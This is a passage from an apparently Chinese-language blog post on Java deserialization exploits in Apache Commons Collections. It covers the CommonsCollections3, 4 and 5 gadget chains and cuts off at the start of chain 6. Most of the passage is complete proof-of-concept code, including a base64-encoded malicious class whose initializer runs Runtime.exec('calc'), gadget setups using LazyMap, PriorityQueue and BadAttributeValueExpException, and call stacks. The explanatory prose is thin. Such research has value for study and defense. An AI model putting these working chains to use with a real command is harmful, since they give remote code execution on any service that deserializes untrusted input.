class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 调用栈如下： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">newInstance:408, Constructor (java.lang.reflect)</span><br><span class="line">transform:106, InstantiateTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:123, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy1 (com.sun.proxy)</span><br><span class="line">readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:53, CommonsCollections3 (com.example)</span><br></pre></td></tr></table></figure></div> ###
CommonsCollections4（CC2+TrAXFilter） 在 CC2 的基础上借助
<code>TrAXFilter</code>+<code>TemplatesImpl</code> 加载字节码绕过对
<code>InvokerTransformer</code> 的过滤，另外我把
<code>TrAXFilter.class</code> 存到 <code>PriorityQueue</code> 中可以避免
<code>Transformer</code> 数组。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TrAXFilter.class, TrAXFilter.class&#125;);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 调用栈如下：
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">defineClass:<span class="number">142</span>, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:<span class="number">346</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:<span class="number">383</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">418</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:<span class="number">64</span>, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">transform:<span class="number">32</span>, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:<span class="number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">795</span>, PriorityQueue (java.util)</span><br><span class="line">...</span><br><span class="line">main:<span class="number">40</span>, CommonsCollections4 (com.example)</span><br></pre></td></tr></table></figure></div> ###
CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）
<code>javax.management.BadAttributeValueExpException</code> 在反序列化
<code>readObject</code> 时如果满足
<code>System.getSecurityManager() == null</code> 条件时会对其中的
<code>val</code> 成员调用 <code>toString</code> 方法。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 而
<code>TiedMapEntry</code> 的 <code>toString</code> 方法最终会调用到
<code>map.get</code> 方法，正好可以与 <code>LazyMap</code>
的利用链结合。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> POC 如下： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, entry);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(exception);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 调用栈如下：
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:132, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:86, BadAttributeValueExpException (javax.management)</span><br><span class="line">...</span><br><span class="line">main:41, CommonsCollections5 (com.example)</span><br></pre></td></tr></table></figure></div> ### CommonsCollections6（HashMap→TiedMapEntry→LazyMap）
<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 的
<code>hashCode</code> 方法会调用到内部成员 <code>map</code> 的
